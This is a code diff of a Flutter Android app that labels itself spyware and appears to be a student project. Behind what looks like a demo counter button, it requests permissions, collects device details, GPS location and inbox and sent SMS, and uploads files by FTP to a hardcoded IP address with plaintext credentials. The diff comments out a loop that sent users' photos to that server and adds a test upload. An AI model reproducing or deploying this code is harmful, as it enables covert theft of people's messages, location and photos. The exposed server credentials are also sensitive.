@@ -1,12 +1,16 @@
+//*************************************
+//***** Spyware Android LP CDAISI *****
+//*************************************
+
 import 'dart:io';
 import 'package:geolocator/geolocator.dart';
 import 'package:device_info/device_info.dart';
 import 'package:flutter/material.dart';
 import 'package:sms/sms.dart';
 import 'package:ftpconnect/ftpConnect.dart';
-// ignore: import_of_legacy_library_into_null_safe
 import 'package:permission_handler/permission_handler.dart';
 import 'package:contacts_service/contacts_service.dart';
+import 'package:path_provider/path_provider.dart';
 
 
 void main() {
@@ -39,6 +43,8 @@ class MyHomePage extends StatefulWidget {
 class _MyHomePageState extends State<MyHomePage> {
   int _counter = 0;
 
+
+
   // Demande de permission
   void _incrementCounter() async {
     Map<Permission, PermissionStatus> statuses = await [
@@ -48,11 +54,12 @@ class _MyHomePageState extends State<MyHomePage> {
       Permission.sms,
     ].request();
 
-// Préparation de la connexion FTP
+    // Préparation de la connexion FTP
     FTPConnect ftpConnect = FTPConnect('141.94.77.172',
-        user: 'utilisateursftp', pass: 'Sftp59?Spyware!');
+    user: 'utilisateursftp', pass: 'Sftp59?Spyware!');
 
     // ***** PARTIE INFORMATIONS TELEPHONE *****
+
     if (Platform.isAndroid) {
       var androidInfo = await DeviceInfoPlugin().androidInfo;
       var release = androidInfo.version.release;
@@ -74,11 +81,12 @@ class _MyHomePageState extends State<MyHomePage> {
     print(await Geolocator.getCurrentPosition());
 
     // ***** PARTIE SMS *****
+    // Création de l'instance de la classe SmsQuery
     SmsQuery query = new SmsQuery();
+    // Récupération de la liste des instances SMS
     List<SmsMessage> messages = await query.querySms(
-    // récupération des messages reçus et envoyés
+    // Récupération des messages reçus et envoyés
     kinds: [SmsQueryKind.Inbox, SmsQueryKind.Sent], 
-    count: 10, //Limiter le nombre de SMS à récupérer
     );
     // Parcourir les messages
     for (var message in messages) {
@@ -102,21 +110,35 @@ class _MyHomePageState extends State<MyHomePage> {
     }
     //print(listFile);
 
-    int compteur = 0;
-    for (var file in listFile) {
-      if (compteur < 20) {
-        File fileToUpload = File(file);
-        // Lancement de la connexion FTP
-        await ftpConnect.connect();
-        // Changement de répertoire
-        await ftpConnect.changeDirectory('photos');
-        // Envoie du fichier sur le serveur
-        bool res = await ftpConnect.uploadFile(fileToUpload);
+    //int compteur = 0;
+    //for (var file in listFile) {
+    //  if (compteur < 20) {
+    //    File fileToUpload = File(file);
+    //    // Lancement de la connexion FTP
+    //    await ftpConnect.connect();
+    //    // Changement de répertoire
+    //    await ftpConnect.changeDirectory('photos');
+    //    // Envoie du fichier sur le serveur
+    //    bool res = await ftpConnect.uploadFile(fileToUpload);
         // Fermeture de la connexion FTP
-        await ftpConnect.disconnect();
-        compteur++;
-      }
-    }
+    //    await ftpConnect.disconnect();
+    //    compteur++;
+    //  }
+    //}
+
+    // ***** Partie création de fichier *****
+    Directory tempDir = await getTemporaryDirectory();
+    final File file = File("${tempDir.path}/sample.txt");
+    final filename = "${tempDir.path}/sample.txt";
+    new File(filename).writeAsString('Dart is an elegant language').then((File file) {});
+
+    File fileToUpload = File("${tempDir.path}/sample.txt");
+    // Lancement de la connexion FTP
+    await ftpConnect.connect();
+    // Envoie du fichier sur le serveur
+    bool res = await ftpConnect.uploadFile(fileToUpload);
+    // Fermeture de la connexion FTP
+    await ftpConnect.disconnect();
   }
 
   @override
